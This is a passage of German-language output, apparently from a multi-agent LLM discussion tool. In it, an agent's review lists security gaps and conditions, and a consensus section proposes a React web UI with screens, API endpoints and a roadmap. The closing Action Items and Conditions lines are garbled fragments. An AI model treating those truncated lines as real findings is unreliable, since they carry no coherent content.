| **3 (mittel)** | Virtualisierung der Nachrichtenliste, Disk‑Cleanup für Workspace‑Uploads, Feature‑Toggles für Nice‑to‑Have‑Funktionen. |
| **4 (low)** | UI‑Polish (Dark‑Mode, Accessibility), optionaler Provider‑Status‑Dashboard, Kosten‑Visualization. |

---

## 6. Fazit & Position  

Der vorgeschlagene UI‑Entwurf ist grundsätzlich solide und deckt die Kern‑User‑Flows ab. Allerdings gibt es **klare Sicherheitslücken** (fehlende Authentifizierung, potenzielle XSS/CSRF, ungesicherte Datei‑Uploads) und **Performance‑Risiken** (WebSocket‑Skalierung, unkontrollierte LLM‑Responses). Diese müssen vor dem MVP‑Rollout behoben werden, sonst riskieren wir Datenlecks, Kostenexplosionen und Service‑Ausfälle.

**Meine Position:**  

[POSITION: SUPPORT_WITH_CONDITIONS]

**Bedingungen für die Unterstützung**

1. **Sicherheits‑Layer** (Auth‑Token, CSRF‑Schutz, CSP, Sanitisation) muss implementiert sein, bevor das UI produktiv eingesetzt wird.  
2. **Upload‑ und Eingabe‑Validierung** (MIME‑Check, Schema‑Validierung) muss zwingend vorhanden sein.  
3. **Rate‑Limiting / Kosten‑Quoten** müssen im Backend konfigurierbar sein und im UI sichtbar gemacht werden.  
4. **Skalierbare Echtzeit‑Kommunikation** (SSE oder WebSocket‑Cluster) muss mindestens für 50 gleichzeitige Jobs getestet werden.  

Nach Erfüllung dieser Bedingungen halte ich das Konzept für umsetzbar und empfehlenswert.

**Position:** ☑️ SUPPORT_WITH_CONDITIONS

**Round Status:**
- Positions: 3 SUPPORT_WITH_CONDITIONS
- Consensus: Yes

---

## Final Consensus

Okay, hier ist mein Vorschlag für ein Web-UI-Konzept für OpenBotMan, unter Berücksichtigung der gegebenen Rahmenbedingungen und Pain Points.

### UX-Konzept: OpenBotMan Web-UI

**Ziel:** Eine intuitive und effiziente Web-Oberfläche zur Steuerung und Überwachung von OpenBotMan-Diskussionen.

**Technologie-Stack:**

*   **Framework:** React (breite Akzeptanz, viele Komponentenbibliotheken, gute TypeScript-Unterstützung)
*   **Styling:** Tailwind CSS (Utility-First, schnelle Entwicklung, einheitliches Design)
*   **State Management:** Zustand über React Context + Websockets für Echtzeit-Updates
*   **UI-Komponenten:** Eine Komponente-Bibliothek wie Shadcn UI (Tailwind-basiert, zugänglich, anpassbar)
*   **Backend-Kommunikation:** `fetch` API oder Axios für HTTP-Requests, Websocket-Client
*   **Diagramme/Visualisierung:** Mermaid.js für Workflow-Visualisierung

**Architektur-Diagramm:**

```ascii
┌───────────────────────┐     HTTP API     ┌───────────────────────┐
│    React Web-UI       ├──────────────────►│   OpenBotMan API      │
│  (localhost:3000)      │◄──────────────────┤  (localhost:8080)      │
│                       │     Websockets   │                       │
│  - Dashboard          ├──────────────────►│  - Express.js         │
│  - Job-Ansicht        │◄──────────────────┤  - Orchestrator       │
│  - Agent-Verwaltung   │                  │                       │
│  - Config-Editor      │                  │                       │
└───────────────────────┘                  └───────────────────────┘
```

**User Flows und Screen-Beschreibungen:**

1.  **Dashboard:**

    *   **Übersicht:** Laufende Jobs (Status, Topic, Team), abgeschlossene Jobs (Ergebnis, Datum)
    *   **Elemente:**
        *   Job-Liste (tabelleartig mit Filtern/Sortierung)
        *   "Neue Diskussion starten"-Button
        *   Globale Statusanzeige (Provider-Verfügbarkeit)
    *   **Zustand:** Abrufen der Job-Liste von der API (`GET /api/v1/jobs`)

2.  **Neue Diskussion starten:**

    *   **Eingabemaske:**
        *   Topic (Textfeld)
        *   Team-Auswahl (Dropdown mit Beschreibungen) oder Agenten-Auswahl (Checkboxen)
        *   Workspace-Upload (optional)
        *   "Start"-Button
    *   **Zustand:** Abrufen der Team-Liste (`GET /api/v1/teams`), Senden der Anfrage (`POST /api/v1/discuss`)
    *   **Nach dem Start:** Weiterleitung zur Job-Ansicht

3.  **Live-Ansicht (Job-Ansicht):**

    *   **Echtzeit-Updates:** Agent-Responses, Konsens-Fortschritt
    *   **Elemente:**
        *   Job-Details (Topic, Team, Status)
        *   Agent-Responses (chronologisch, mit Agent-Name/Emoji)
        *   Mermaid.js Workflow-Visualisierung
        *   Fortschrittsbalken für Konsens
    *   **Zustand:** Websocket-Verbindung für Echtzeit-Updates, initiale Daten von der API (`GET /api/v1/jobs/:id`)

4.  **Ergebnis-Ansicht (Job-Ansicht nach Abschluss):**

    *   **Konsens:** Zusammenfassung des Ergebnisses
    *   **Action Items:** Liste der identifizierten Aufgaben
    *   **Export:** Markdown/PDF-Download
    *   **Elemente:**
        *   Konsens-Text (formatierter Text)
        *   Action-Item-Liste (Checkboxen, bearbeitbar)
        *   Download-Buttons
        *   ggf. Kosten-Übersicht (wenn implementiert)

5.  **Agent-Verwaltung:**

    *   **Liste der Agents:** Name, Provider, Model, Prompt
    *   **Funktionen:** Erstellen, Bearbeiten, Löschen
    *   **Formular:** Felder für Agent-Konfiguration (analog zu `config.yaml`)
    *   **Zustand:** CRUD-Operationen auf der API (`GET/POST/PUT/DELETE /api/v1/agents`)

6.  **Team-Verwaltung:**

    *   **Liste der Teams:** Name, Beschreibung, Agents
    *   **Funktionen:** Erstellen, Bearbeiten, Löschen
    *   **Formular:** Felder für Team-Konfiguration (analog zu `config.yaml`)
    *   **Zustand:** CRUD-Operationen auf der API (`GET/POST/PUT/DELETE /api/v1/teams`)

7.  **Prompt-Editor:**

    *   **Editor:** Monaco Editor (VSCode-ähnlich) für YAML/Text
    *   **Funktionen:** Bearbeiten, Speichern
    *   **Zustand:** CRUD-Operationen auf der API (`GET/PUT /api/v1/prompts/:id`)

8.  **Provider-Status:**

    *   **Anzeige:** Tabelle oder Liste mit Provider-Namen und Status (online/offline)
    *   **Zustand:** Abrufen des Status von der API (`GET /api/v1/providers`)
    *   **Implementierung:** Health-Checks auf den einzelnen Provider-Endpunkten

9.  **Kosten-Tracking:**

    *   **Anzeige:** Kosten pro Diskussion, Gesamtkosten
    *   **Implementierung:** Erfordert Erfassung der API-Nutzung pro Agent/Diskussion

**Implementierungs-Roadmap:**

*   **MVP:**
    1.  Dashboard (Job-Liste, "Neue Diskussion starten")
    2.  Live-Ansicht (mit Agent-Responses)
    3.  Ergebnis-Ansicht (Konsens, Export)
    4.  Integration mit bestehender API
*   **Phase 2:**
    1.  Agent-Verwaltung
    2.  Team-Verwaltung
    3.  Prompt-Editor
*   **Phase 3:**
    1.  Provider-Status
    2.  Kosten-Tracking
    3.  Workflow-Visualisierung

**Offene Fragen:**

*   **Echtzeit-Kommunikation:** Websockets oder Server-Sent Events (SSE)? Websockets sind bidirektional, was für zukünftige Features (z.B. Agent-Interaktion) nützlich sein könnte.
*   **Konfigurations-Management:** Wie werden Änderungen an der `config.yaml` angewendet, ohne den Server neu starten zu müssen?  Ein "Reload"-Button im UI, der die Konfiguration neu lädt, wäre eine Option.
*   **Fehlerbehandlung:** Wie werden Fehler von den LLMs oder der API im UI dargestellt?

**Zusammenfassung:**

Das vorgeschlagene Web-UI-Konzept setzt auf React, Tailwind CSS und eine Komponente-Bibliothek, um eine moderne und responsive Oberfläche zu schaffen.  Die Architektur ist so konzipiert, dass sie mit der bestehenden API integriert werden kann und durch Websockets Echtzeit-Updates ermöglicht.  Die Roadmap priorisiert die Kernfunktionen (MVP) und erweitert diese schrittweise um zusätzliche Features.

[POSITION: SUPPORT]


## Action Items

- [ ] Items:** Liste der identifizierten Aufgaben

## Conditions & Concerns

### Conditions
- Security & Quality Expert: al GET**

---

*Generated by OpenBotMan Multi-Agent Discussion*